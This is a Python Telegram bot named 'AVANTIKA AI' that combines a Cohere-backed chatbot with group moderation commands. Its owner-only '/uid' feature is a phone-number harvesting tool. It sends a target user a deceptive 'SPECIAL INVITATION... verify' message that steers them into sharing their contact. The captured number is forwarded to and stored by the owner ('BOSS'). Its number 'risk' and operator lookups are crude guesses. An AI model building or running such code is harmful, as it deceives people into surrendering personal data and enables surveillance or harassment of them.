import os
import asyncio
import cohere
import pytz
import requests
from datetime import datetime, timedelta
from telegram import Update, ChatPermissions, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ChatType

# ================== KEYS ==================
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
COHERE_API_KEY = os.environ.get("COHERE_API_KEY")
# ==========================================

OWNER_USER_ID = 7614459746

co = cohere.Client(COHERE_API_KEY)
IST = pytz.timezone('Asia/Kolkata')
user_history = {}
active_groups = {}
allowed_users = {7614459746}
group_warnings = {}
group_rules = {}
group_notes = {}
saved_contacts = {}
pending_requests = {}  # Track auto requests
number_db = {}  # Number database

AVANTIKA_PREAMBLE = """You are AVANTIKA AI — Premium, Smart, Multi-Language assistant.
Detect user's language, reply in SAME language. Detailed answers.
Use **Bold**, _Italic_, emojis 🔥💯😂👊💎⚡🎯❤️. Natural & friendly."""

def get_ist_now(): return datetime.now(IST)

def parse_time(ts):
    ts = ts.lower().strip().replace(" ", "")
    if not ts: return None
    for w, m in [('seconds',1/60),('second',1/60),('sec',1/60),('minutes',1),('minute',1),('mins',1),('min',1),('hours',60),('hour',60),('hrs',60),('hr',60),('days',1440),('day',1440)]:
        if ts.endswith(w):
            try: return float(ts[:-len(w)])*m
            except: pass
    try:
        if ts.endswith('s'): return float(ts[:-1])/60
        if ts.endswith('m'): return float(ts[:-1])
        if ts.endswith('h'): return float(ts[:-1])*60
        if ts.endswith('d'): return float(ts[:-1])*1440
        return float(ts)
    except: return None

def format_time(m):
    ts = int(m*60)
    if ts <= 0: return "0 seconds"
    d, ts = divmod(ts,86400); h, ts = divmod(ts,3600); mi, s = divmod(ts,60)
    p = []
    if d: p.append(f"*{d}* day{'s' if d!=1 else ''}")
    if h: p.append(f"*{h}* hour{'s' if h!=1 else ''}")
    if mi: p.append(f"*{mi}* minute{'s' if mi!=1 else ''}")
    if s and not d: p.append(f"*{s}* second{'s' if s!=1 else ''}")
    return ", ".join(p) if p else "0 seconds"

def is_allowed(uid): return uid in allowed_users

def get_ai_reply(text, chat_id):
    if chat_id not in user_history: user_history[chat_id] = []
    ch = []
    for msg in user_history[chat_id][-4:]:
        r = "USER" if msg["role"]=="user" else "CHATBOT"
        ch.append({"role":r,"message":msg["content"]})
    try:
        resp = co.chat(message=text, chat_history=ch, preamble=AVANTIKA_PREAMBLE, temperature=0.95, max_tokens=800)
        return resp.text
    except: return "😅 _Fir se bol!_ 💎"

# ================== TELEGRAM API HELPERS ==================
def get_telegram_user(uid):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getChat"
    try:
        resp = requests.post(url, json={"chat_id": uid}, timeout=10)
        data = resp.json()
        return data["result"] if data.get("ok") else None
    except: return None

def get_photos_count(uid):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUserProfilePhotos"
    try:
        resp = requests.post(url, json={"user_id": uid, "limit": 1}, timeout=10)
        data = resp.json()
        return data["result"]["total_count"] if data.get("ok") else 0
    except: return 0

def check_phone(uid):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getChat"
    try:
        resp = requests.post(url, json={"chat_id": uid}, timeout=10)
        data = resp.json()
        if data.get("ok") and "phone_number" in data["result"]:
            return data["result"]["phone_number"]
        return None
    except: return None

def generate_number_report(number):
    clean = number.replace("+", "").replace(" ", "").replace("-", "")
    report = {"number": number, "clean": clean, "length": len(clean)}
    
    # Country
    if clean.startswith("91") or (len(clean)==10 and clean[0] in '789'): report["country"] = "🇮🇳 India"
    elif clean.startswith("1"): report["country"] = "🇺🇸 USA"
    else: report["country"] = "🌍 International"
    
    # Operator India
    if clean.startswith("91") or (len(clean)==10 and clean[0] in '789'):
        prefix = clean[-10:-8] if len(clean)>=10 else clean[:2]
        op_map = {'70':'Jio/VI','78':'Jio','79':'Jio','80':'Airtel','81':'Airtel','82':'Airtel','83':'Airtel','84':'Airtel','85':'Airtel','86':'Airtel','87':'Airtel','88':'Airtel','89':'Airtel','90':'VI','91':'VI','92':'VI','93':'Jio','94':'Jio','95':'Jio','96':'Jio','97':'Jio','98':'Jio','99':'Jio'}
        report["operator"] = op_map.get(prefix, "Unknown")
    else: report["operator"] = "International"
    
    # Risk
    report["risk"] = "🟢 LOW" if len(clean) >= 10 else "🔴 HIGH"
    report["type"] = "📱 Mobile" if clean[0] in '789' else "📞 Other"
    
    return report

# ================== ONE-CLICK NUMBER SYSTEM ==================
async def uid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """UID dalo → START button bhejo → Auto number share"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_USER_ID:
        await update.message.reply_text("🔒 *ACCESS DENIED!* 👑\n_Sirf BOSS use kar sakta hai!_", parse_mode="Markdown")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔍 *TRUE CALLER — ONE CLICK SYSTEM* 🔍\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 *USAGE:*\n"
            "• `/uid 123456789` — Auto START+Share\n"
            "• `/uid @username` — Username se\n"
            "• `/uid +919876543210` — Number lookup\n\n"
            "⚡ *KAISE KAAM KARTA HAI:*\n"
            "1️⃣ BOSS `/uid` bhejta hai\n"
            "2️⃣ User ko *START* button milta hai\n"
            "3️⃣ User START click karta hai\n"
            "4️⃣ *Auto number share* ho jata hai\n"
            "5️⃣ BOSS ko *turant mil jata hai!*\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "👑 _Only BOSS!_ 🔥",
            parse_mode="Markdown"
        )
        return
    
    target = context.args[0]
    target_uid = None
    
    # Resolve
    if target.startswith("@"):
        try:
            chat = await context.bot.get_chat(target)
            target_uid = chat.id
        except:
            await update.message.reply_text("❌ *Not found!*", parse_mode="Markdown")
            return
    else:
        target = target.replace("+", "").replace(" ", "").replace("-", "")
        try:
            target_uid = int(target)
        except:
            # Number search
            num_report = generate_number_report(target)
            db_match = number_db.get(target, {})
            
            msg = "🔍 *NUMBER LOOKUP* 🔍\n\n"
            msg += f"📱 *Number:* `{target}`\n"
            msg += f"🌍 *Country:* {num_report['country']}\n"
            msg += f"📡 *Operator:* {num_report['operator']}\n"
            msg += f"⚠️ *Risk:* {num_report['risk']}\n"
            msg += f"📋 *Type:* {num_report['type']}\n"
            
            if db_match:
                msg += f"\n💾 *DATABASE:*\n• Name: {db_match.get('name')}\n• Reports: {db_match.get('reports',0)}\n"
            
            keyboard = [[{"text": "📞 CALL", "url": f"tel:{target}"}, {"text": "📱 WHATSAPP", "url": f"https://wa.me/{target}"}]]
            await update.message.reply_text(msg, parse_mode="Markdown", reply_markup={"inline_keyboard": keyboard})
            return
    
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
    
    # Telegram data
    tg_user = get_telegram_user(target_uid)
    photo_count = get_photos_count(target_uid)
    phone_visible = check_phone(target_uid)
    
    # Mark as pending
    pending_requests[target_uid] = {
        "requested_by": user_id,
        "requested_at": datetime.now().strftime("%d %b %Y, %I:%M %p"),
        "status": "pending"
    }
    
    # === BOSS KO REPORT + START BUTTON ===
    msg = "🔍 *TRUE CALLER REPORT* 🔍\n\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━\n👤 *BASIC INFO*\n━━━━━━━━━━━━━━━━━━━━━━\n"
    
    if tg_user:
        full_name = tg_user.get("first_name", "Unknown")
        if tg_user.get("last_name"): full_name += f" {tg_user['last_name']}"
        msg += f"• *Name:* {full_name}\n"
        msg += f"• *UID:* `{target_uid}`\n"
        msg += f"• *Username:* @{tg_user.get('username', 'None')}\n"
        msg += f"• *Bot:* {'🤖' if tg_user.get('is_bot') else '👤'}\n"
        msg += f"• *Photos:* {photo_count} 🖼️\n"
        msg += f"• *Premium:* {'⭐' if tg_user.get('is_premium') else 'No'}\n"
    else:
        msg += f"• *UID:* `{target_uid}`\n• *Photos:* {photo_count} 🖼️\n"
    
    msg += "\n━━━━━━━━━━━━━━━━━━━━━━\n📱 *PHONE*\n━━━━━━━━━━━━━━━━━━━━━━\n"
    
    if phone_visible:
        msg += f"• *Number:* ✅ `{phone_visible}`\n"
        num_report = generate_number_report(phone_visible)
        msg += f"• *Operator:* {num_report['operator']}\n"
    else:
        msg += "• *Status:* 🔒 Privacy ON\n"
        msg += "• 👇 *Click below to auto-request!* 👇\n"
    
    msg += f"\n━━━━━━━━━━━━━━━━━━━━━━\n💎 _AVANTIKA AI_\n━━━━━━━━━━━━━━━━━━━━━━"
    
    # Buttons
    keyboard = []
    if phone_visible:
        clean = phone_visible.replace("+","").replace(" ","")
        keyboard = [
            [InlineKeyboardButton("📞 CALL", url=f"tel:{clean}"), InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={target_uid}")],
            [InlineKeyboardButton("📱 WHATSAPP", url=f"https://wa.me/{clean}"), InlineKeyboardButton("💾 SAVE", callback_data=f"save_{target_uid}")]
        ]
    else:
        keyboard = [
            [InlineKeyboardButton("🚀 SEND START TO USER", callback_data=f"autostart_{target_uid}")],
            [InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={target_uid}")]
        ]
    
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all button clicks"""
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    
    # ========== AUTO START → SHARE CONTACT ==========
    if data.startswith("autostart_"):
        target_uid = int(data.replace("autostart_", ""))
        
        # BOSS ko bataye
        await query.edit_message_text(
            f"🚀 *START Button Sent!* 📱\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *Target:* `{target_uid}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⏳ _User ko START button bhej diya!_\n"
            f"📱 _Jaise hi user START click karega → Number BOSS ko mil jayega!_\n\n"
            f"💡 _Agar user ne bot start nahi kiya to fail hoga._",
            parse_mode="Markdown"
        )
        
        # User ko START button bhejo
        start_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("▶️ START & SHARE NUMBER 📱", callback_data=f"usershare_{target_uid}")]
        ])
        
        try:
            await context.bot.send_message(
                chat_id=target_uid,
                text="🎉 *SPECIAL INVITATION!* 🎉\n\n"
                     "━━━━━━━━━━━━━━━━━━━━━━\n"
                     "🌟 _Click the button below to verify!_\n"
                     "📱 _Your number will be auto-shared!_\n"
                     "━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown",
                reply_markup=start_keyboard
            )
        except Exception as e:
            await query.edit_message_text(
                f"❌ *FAILED!*\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⚠️ _User ne bot block/start nahi kiya._\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💡 *Solution:* _User ko `/start` bhejne bolo pehle._\n"
                f"🔍 _Phir `/uid {target_uid}` try karo._",
                parse_mode="Markdown"
            )
    
    # ========== USER CLICKED START → SEND CONTACT BUTTON ==========
    elif data.startswith("usershare_"):
        target_uid = int(data.replace("usershare_", ""))
        
        # Contact share keyboard
        contact_keyboard = ReplyKeyboardMarkup(
            [[KeyboardButton("📱 SHARE MY NUMBER", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        
        await context.bot.send_message(
            chat_id=target_uid,
            text="✅ *VERIFIED!* 🎉\n\n👇 _Now tap the button below to complete:_",
            parse_mode="Markdown",
            reply_markup=contact_keyboard
        )
        
        await query.edit_message_text(
            "✅ *Success!* 🎉\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📱 _Now tap SHARE MY NUMBER button!_\n"
            "━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
    
    # ========== SAVE CONTACT ==========
    elif data.startswith("save_"):
        target_uid = int(data.replace("save_", ""))
        tg_user = get_telegram_user(target_uid)
        name = tg_user.get("first_name", "Unknown") if tg_user else "Unknown"
        saved_contacts[target_uid] = {
            "name": name,
            "number": "Pending",
            "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")
        }
        await query.edit_message_text(f"💾 *Saved!* ✅\n• {name}\n• UID: `{target_uid}`", parse_mode="Markdown")

# ========== USER SHARES CONTACT → BOSS KO FORWARD ==========
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """When user shares contact"""
    if not update.message or not update.message.contact: return
    
    contact = update.message.contact
    uid = update.effective_user.id
    save_uid = contact.user_id if contact.user_id else uid
    
    phone = contact.phone_number
    
    # Database mein add
    number_db[phone] = {
        "name": contact.first_name,
        "reports": number_db.get(phone, {}).get("reports", 0) + 1,
        "added_at": datetime.now().strftime("%d %b %Y")
    }
    
    # Saved contacts mein add
    saved_contacts[save_uid] = {
        "name": contact.first_name,
        "number": phone,
        "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p"),
        "auto_saved": True
    }
    
    # Clear pending
    pending_requests.pop(save_uid, None)
    
    # BOSS ko forward
    msg = "📱 *NEW NUMBER RECEIVED!* 📱\n\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"👤 *Name:* {contact.first_name}\n"
    msg += f"📱 *Phone:* `{phone}`\n"
    msg += f"🆔 *UID:* `{save_uid}`\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"💾 _Auto-saved! `/savedlist`_\n"
    msg += f"🔍 _`/uid {save_uid}` for details_\n"
    msg += f"🔍 _`/uid {phone}` for number lookup_"
    
    # Send to BOSS with action buttons
    clean_phone = phone.replace("+", "").replace(" ", "")
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📞 CALL", url=f"tel:{clean_phone}"), InlineKeyboardButton("💬 CHAT", url=f"tg://user?id={save_uid}")],
        [InlineKeyboardButton("📱 WHATSAPP", url=f"https://wa.me/{clean_phone}"), InlineKeyboardButton("💾 SAVE", callback_data=f"save_{save_uid}")]
    ])
    
    await context.bot.send_message(OWNER_USER_ID, msg, parse_mode="Markdown", reply_markup=keyboard)
    
    # User ko thanks
    await update.message.reply_text("✅ *Successfully Shared!* 🎉\n\n_Keyboard removed_", parse_mode="Markdown")
    try: await context.bot.send_message(uid, "🔓", reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True))
    except: pass

# ================== SAVE CONTACTS ==================
async def savecontact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_USER_ID:
        await update.message.reply_text("❌ *Sirf BOSS!* 👑", parse_mode="Markdown"); return
    if len(context.args) < 2:
        await update.message.reply_text("💾 `/savecontact UID Name Number [Notes]`", parse_mode="Markdown"); return
    try:
        uid = int(context.args[0]) if not update.message.reply_to_message else update.message.reply_to_message.from_user.id
        name = context.args[1] if not update.message.reply_to_message else context.args[0]
        number = context.args[2] if not update.message.reply_to_message else context.args[1]
        saved_contacts[uid] = {"name": name, "number": number, "notes": " ".join(context.args[3:]) if len(context.args)>3 else "", "saved_at": datetime.now().strftime("%d %b %Y, %I:%M %p")}
        await update.message.reply_text(f"💾 *SAVED!* ✅\n• {name}\n• `{number}`\n• UID: `{uid}`", parse_mode="Markdown")
    except: await update.message.reply_text("❌ *Error!*", parse_mode="Markdown")

async def savedlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_USER_ID: await update.message.reply_text("❌ *Sirf BOSS!*", parse_mode="Markdown"); return
    if not saved_contacts: await update.message.reply_text("📝 _No saved contacts! `/savecontact`_", parse_mode="Markdown"); return
    msg = "💾 *SAVED CONTACTS*\n\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, info in saved_contacts.items(): msg += f"• *{info['name']}* — `{info['number']}` (UID: `{uid}`)\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: {len(saved_contacts)}"
    await update.message.reply_text(msg, parse_mode="Markdown")

# ================== ALL OTHER FEATURES ==================
async def adduser(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    if not ctx.args: return
    try: allowed_users.add(int(ctx.args[0])); await update.message.reply_text("✅ *Added!*")
    except: pass

async def removeuser(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    if not ctx.args: return
    try:
        rid = int(ctx.args[0])
        if rid == OWNER_USER_ID: return
        allowed_users.discard(rid); await update.message.reply_text("✅ *Removed!*")
    except: pass

async def userlist(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    await update.message.reply_text(f"👥 *Users:* {len(allowed_users)}")

async def broadcast(update, ctx):
    if update.effective_user.id != OWNER_USER_ID: return
    if not ctx.args: return
    for uid in allowed_users:
        try: await ctx.bot.send_message(uid, "📢 *BOSS* 👑\n\n" + " ".join(ctx.args), parse_mode="Markdown")
        except: pass

async def get_id(update, ctx):
    if update.message.reply_to_message: await update.message.reply_text(f"🆔 `{update.message.reply_to_message.from_user.id}`")
    else: await update.message.reply_text(f"🆔 `{update.effective_user.id}`")

async def setrules(update, ctx):
    if not ctx.args: return
    group_rules[update.effective_chat.id] = " ".join(ctx.args)
    await update.message.reply_text("📜 *Rules Set!*")

async def rules(update, ctx):
    await update.message.reply_text(group_rules.get(update.effective_chat.id, "📜 _No rules!_"))

async def addnote(update, ctx):
    cid = update.effective_chat.id
    if not ctx.args: return
    if cid not in group_notes: group_notes[cid] = []
    group_notes[cid].append(" ".join(ctx.args))
    await update.message.reply_text("✅ *Note Added!*")

async def notes(update, ctx):
    cid = update.effective_chat.id
    if cid in group_notes and group_notes[cid]: await update.message.reply_text("📝 *Notes:*\n" + "\n".join([f"• {n}" for n in group_notes[cid]]))
    else: await update.message.reply_text("📝 _No notes!_")

async def clearnotes(update, ctx): group_notes[update.effective_chat.id] = []; await update.message.reply_text("✅ *Cleared!*")

async def pin(update, ctx):
    if not update.message.reply_to_message: return
    try: await update.message.reply_to_message.pin()
    except: pass

async def unpin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type == ChatType.PRIVATE: return
    try: await context.bot.unpin_all_chat_messages(update.effective_chat.id)
    except: pass

async def warn(update, ctx):
    cid = update.effective_chat.id
    if not update.message.reply_to_message: return
    t = update.message.reply_to_message.from_user
    if cid not in group_warnings: group_warnings[cid] = {}
    if t.id not in group_warnings[cid]: group_warnings[cid][t.id] = 0
    group_warnings[cid][t.id] += 1
    await update.message.reply_text(f"⚠️ *Warning!* {t.first_name} *{group_warnings[cid][t.id]}/3*")

async def clearwarns(update, ctx):
    cid = update.effective_chat.id
    if update.message.reply_to_message:
        t = update.message.reply_to_message.from_user
        if cid in group_warnings and t.id in group_warnings[cid]: group_warnings[cid][t.id] = 0
    else: group_warnings[cid] = {}
    await update.message.reply_text("✅ *Cleared!*")

async def ban_user(update, ctx):
    t = update.message.reply_to_message.from_user if update.message.reply_to_message else None
    if not t: return
    try: await ctx.bot.ban_chat_member(update.effective_chat.id, t.id); await update.message.reply_text(f"🔨 *BANNED!*")
    except: pass

async def unban_user(update, ctx):
    if not ctx.args: return
    try: await ctx.bot.unban_chat_member(update.effective_chat.id, int(ctx.args[0])); await update.message.reply_text("✅ *UNBANNED!*")
    except: pass

async def mute_user(update, ctx):
    cid = update.effective_chat.id
    if update.effective_chat.type == ChatType.PRIVATE: return
    t, ts = None, "1h"
    if update.message.reply_to_message:
        t = update.message.reply_to_message.from_user
        if ctx.args: ts = " ".join(ctx.args)
    if not t or t.id==update.effective_user.id or t.is_bot: return
    mm = parse_time(ts)
    if not mm or mm>43200 or mm<=0: return
    nw, ut = get_ist_now(), get_ist_now()+timedelta(minutes=mm)
    try:
        await ctx.bot.restrict_chat_member(chat_id=cid,user_id=t.id,
            permissions=ChatPermissions(can_send_messages=False,can_send_audios=False,can_send_documents=False,can_send_photos=False,can_send_videos=False,can_send_video_notes=False,can_send_voice_notes=False,can_send_polls=False,can_send_other_messages=False,can_add_web_page_previews=False,can_change_info=False,can_invite_users=False,can_pin_messages=False),until_date=ut)
        tn = t.first_name or "User"
        await update.message.reply_text(f"🔇 *MUTED!* 👤 {tn}\n⏱️ {format_time(mm)}\n🔓 `{ut.strftime('%I:%M %p')}`\n⏰ Auto")
        async def auto():
            await asyncio.sleep(mm*60)
            try:
                await ctx.bot.restrict_chat_member(chat_id=cid,user_id=t.id,
                    permissions=ChatPermissions(can_send_messages=True,can_send_audios=True,can_send_documents=True,can_send_photos=True,can_send_videos=True,can_send_video_notes=True,can_send_voice_notes=True,can_send_polls=True,can_send_other_messages=True,can_add_web_page_previews=True,can_change_info=False,can_invite_users=False,can_pin_messages=False))
                await ctx.bot.send_message(cid, f"✅ *AUTO UNMUTED!* {tn}")
            except: pass
        asyncio.create_task(auto())
    except: pass

async def unmute_user(update, ctx):
    t = update.message.reply_to_message.from_user if update.message.reply_to_message else None
    if not t: return
    try:
        await ctx.bot.restrict_chat_member(chat_id=update.effective_chat.id,user_id=t.id,
            permissions=ChatPermissions(can_send_messages=True,can_send_audios=True,can_send_documents=True,can_send_photos=True,can_send_videos=True,can_send_video_notes=True,can_send_voice_notes=True,can_send_polls=True,can_send_other_messages=True,can_add_web_page_previews=True,can_change_info=False,can_invite_users=False,can_pin_messages=False))
        await update.message.reply_text(f"✅ *UNMUTED!* {t.first_name}")
    except: pass

async def welcome(update, ctx):
    if not update.message.new_chat_members: return
    for u in update.message.new_chat_members:
        if u.id == ctx.bot.id: await ctx.bot.send_message(update.effective_chat.id, "✨ *AVANTIKA AI JOINED!* ✨\n\n👑 _Admin_ */activate*\n💻 Coding | 📚 Knowledge | 😂 Fun\n🔍 `/uid` — One Click Number!\n\n🔥 _Activate me!_", parse_mode="Markdown")
        else: await ctx.bot.send_message(update.effective_chat.id, f"✨ *WELCOME!* ✨\n\n👤 *{u.first_name}*\n🌟 _Aapka swagat hai!_ 🎉\n💎 Premium AI | 💻 Coding | 📚 Knowledge | 😂 Fun", parse_mode="Markdown")

async def start(update, ctx):
    cid = update.effective_chat.id; ct = update.effective_chat.type; uid = update.effective_user.id
    if ct == ChatType.PRIVATE:
        if uid == OWNER_USER_ID:
            user_history[cid] = []
            await update.message.reply_text(
                "👑 *WELCOME BACK BOSS!* 👑\n\n💎 *AVANTIKA AI — ONE CLICK NUMBER!*\n\n"
                "🔍 `/uid 123456789` — Auto START+Share\n📱 `/uid @username` — Username lookup\n📞 `/uid +919876543210` — Number lookup\n\n"
                "/start /clear /activate\n/mute /unmute /ban /unban\n/uid /savecontact /savedlist\n/broadcast /id\n\n_Bolo boss!_ 🔥",
                parse_mode="Markdown"
            )
        elif is_allowed(uid): user_history[cid] = []; await update.message.reply_text("✅ *Access Granted!*")
        else: await update.message.reply_text("🔒 *Access Denied!*")
    else:
        user_history[cid] = []; await update.message.reply_text("👋 *AVANTIKA AI* 💎\n\n👑 _Admin_ */activate*")

async def activate(update, ctx):
    cid = update.effective_chat.id
    if update.effective_chat.type == ChatType.PRIVATE: return
    if update.effective_user.id not in [a.user.id for a in await ctx.bot.get_chat_administrators(cid)]: await update.message.reply_text("❌ *ADMIN ONLY!*"); return
    active_groups[cid] = True
    await update.message.reply_text("✅ *ACTIVATED!* 🔥\n❌ /deactivate")

async def deactivate(update, ctx):
    if update.effective_chat.type == ChatType.PRIVATE: return
    active_groups[update.effective_chat.id] = False; await update.message.reply_text("🔴 *OFF!*")

async def clear(update, ctx):
    cid = update.effective_chat.id
    if update.effective_user.id != OWNER_USER_ID: return
    user_history[cid] = []; group_warnings.pop(cid, None); group_rules.pop(cid, None); group_notes.pop(cid, None)
    await update.message.reply_text("✅ *COMPLETE RESET!* 🔄")

async def handle(update, ctx):
    cid = update.effective_chat.id; ct = update.effective_chat.type; msg = update.message; uid = update.effective_user.id
    if msg.new_chat_members: await welcome(update, ctx); return
    if ct == ChatType.PRIVATE and not is_allowed(uid): await msg.reply_text("🔒 *Permission nahi!*"); return
    if ct != ChatType.PRIVATE and (cid not in active_groups or not active_groups[cid]): return
    if not msg.text: return
    await ctx.bot.send_chat_action(chat_id=cid, action="typing")
    try:
        reply = get_ai_reply(msg.text, cid)
        if cid not in user_history: user_history[cid] = []
        user_history[cid].append({"role":"user","content":msg.text})
        user_history[cid].append({"role":"assistant","content":reply})
        user_history[cid] = user_history[cid][-10:]
        await msg.reply_text(reply, parse_mode="Markdown")
    except: pass

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    for cmd, fn in [
        ("start",start),("activate",activate),("deactivate",deactivate),("clear",clear),
        ("mute",mute_user),("unmute",unmute_user),("ban",ban_user),("unban",unban_user),
        ("warn",warn),("clearwarns",clearwarns),("setrules",setrules),("rules",rules),
        ("addnote",addnote),("notes",notes),("clearnotes",clearnotes),
        ("pin",pin),("unpin",unpin),("info",lambda u,c: u.message.reply_text(f"🆔 {u.effective_user.id}")),
        ("adduser",adduser),("removeuser",removeuser),("userlist",userlist),
        ("broadcast",broadcast),("id",get_id),
        ("uid",uid_command),("savecontact",savecontact),("savedlist",savedlist)
    ]:
        app.add_handler(CommandHandler(cmd,fn))
    app.add_handler(CommandHandler("mutelist",lambda u,c: u.message.reply_text("🔇 */mute 10s 5m 2h 1d 30d*\n🔊 */unmute* | 🔍 */uid*")))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.ALL, handle))
    print("👑 AVANTIKA AI — ONE CLICK NUMBER!"); app.run_polling()

if __name__ == "__main__": main()
